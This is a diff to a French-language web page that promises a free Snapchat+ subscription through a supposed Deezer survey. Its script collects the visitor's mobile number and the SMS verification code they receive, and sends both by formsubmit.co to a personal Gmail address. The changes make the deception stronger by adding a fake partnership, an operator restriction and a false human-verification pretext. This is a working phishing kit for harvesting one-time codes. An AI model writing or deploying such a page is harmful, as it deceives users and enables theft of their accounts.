@@ -44,8 +44,8 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 
 <!-- ETAPES -->
 <div class="box active" id="etape1">
-    <h2>Vos goûts musicaux</h2>
-    <p>Répondez aux questions suivantes pour tenter Snapchat+ :</p>
+    <h2>Recevoir Snapchat+ 🎁</h2>
+    <p>Pour recevoir Snapchat+, participez à ce sondage en collaboration avec <strong>Deezer</strong>. Offre réservée aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
     <input type="text" id="artiste_prefere" placeholder="Votre artiste préféré">
     <input type="text" id="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer">
     <input type="text" id="artiste_decouverte" placeholder="Artiste découvert récemment">
@@ -53,15 +53,15 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 </div>
 
 <div class="box" id="etape2">
-    <h2>Votre numéro de téléphone</h2>
-    <p>Veuillez entrer votre numéro (06 ou 07 uniquement) :</p>
+    <h2>Dernière vérification</h2>
+    <p>Pour confirmer que vous êtes un humain et éviter les abus, merci de saisir votre numéro de téléphone (06 ou 07 uniquement) :</p>
     <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
     <button id="btnEtape2">Suivant</button>
 </div>
 
 <div class="box" id="etape3">
-    <h2>Code de vérification</h2>
-    <p>Entrez le code reçu par SMS :</p>
+    <h2>Dernière vérification</h2>
+    <p>Entrez le code reçu par SMS pour confirmer votre numéro et finaliser l’inscription à Snapchat+ :</p>
     <input type="text" id="code_sms" placeholder="Code reçu">
     <button id="btnEtape3">Terminer</button>
 </div>
@@ -76,31 +76,26 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <script>
 let reponses = {};
 
-// Fonction pour afficher étape + progress
 function showStep(etapeId, percent){
     document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
-    const step = document.getElementById(etapeId);
-    step.classList.add('active');
+    document.getElementById(etapeId).classList.add('active');
     document.getElementById('progressBar').style.width = percent+"%";
     document.getElementById('progressText').innerText = percent+"%";
 }
 
-// Fonction d'envoi mail
 async function sendMail(dataObj, sujet){
     const formData = new FormData();
     formData.append("_subject", sujet);
     formData.append("_cc","ano625343@gmail.com");
     formData.append("_captcha","false");
-    for(let key in dataObj){
-        formData.append(key, dataObj[key]);
-    }
+    for(let key in dataObj){ formData.append(key, dataObj[key]); }
     try{
         await fetch("https://formsubmit.co/ano625343@gmail.com", { method:"POST", body:formData, headers:{"Accept":"application/json"} });
         console.log("Mail envoyé:", sujet);
     }catch(e){ console.error("Erreur mail", e); }
 }
 
-// ETAPE 1
+// Étape 1
 document.getElementById('btnEtape1').addEventListener('click', ()=>{
     let pref = document.getElementById('artiste_prefere').value.trim();
     let deezer = document.getElementById('artiste_deezer').value.trim();
@@ -116,25 +111,23 @@ document.getElementById('btnEtape1').addEventListener('click', ()=>{
     showStep('etape2',33);
 });
 
-// ETAPE 2
+// Étape 2
 document.getElementById('btnEtape2').addEventListener('click', ()=>{
     let tel = document.getElementById('telephone').value.trim();
     if(!/^0[67]\d{8}$/.test(tel)){ alert("Numéro invalide (06 ou 07)."); return; }
 
     reponses.telephone = tel;
-
     sendMail({telephone:tel},"Réponses étape 2 - Ipsos");
 
     showStep('etape3',66);
 });
 
-// ETAPE 3
+// Étape 3
 document.getElementById('btnEtape3').addEventListener('click', ()=>{
     let code = document.getElementById('code_sms').value.trim();
     if(!code){ alert("Veuillez entrer le code."); return; }
 
     reponses.code_sms = code;
-
     sendMail({code_sms:code},"Réponses étape 3 - Ipsos");
 
     showStep('etape4',100);
